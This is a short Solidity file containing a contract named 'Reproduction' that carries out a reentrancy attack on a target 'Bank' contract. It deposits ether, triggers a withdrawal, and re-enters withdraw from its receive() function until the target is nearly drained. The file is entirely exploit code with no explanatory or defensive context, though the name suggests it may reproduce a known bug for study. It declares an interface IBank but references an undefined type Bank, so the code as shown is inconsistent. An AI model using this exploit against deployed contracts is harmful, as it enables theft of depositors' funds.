interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank public target;
    address public owner;

    constructor(address _target) {
        target = Bank(_target);
        owner = msg.sender;
    }

    function setup() external payable {
        require(msg.sender == owner, "Not authorized");
        require(msg.value > 0, "Must send ether");
        _makeDeposit();
    }

    function _makeDeposit() internal {
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        require(msg.sender == owner, "Only owner");
        _beginWithdraw(amount);
    }

    function _beginWithdraw(uint amount) internal {
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance > msg.value) {
            target.withdraw(msg.value);
        }
    }
}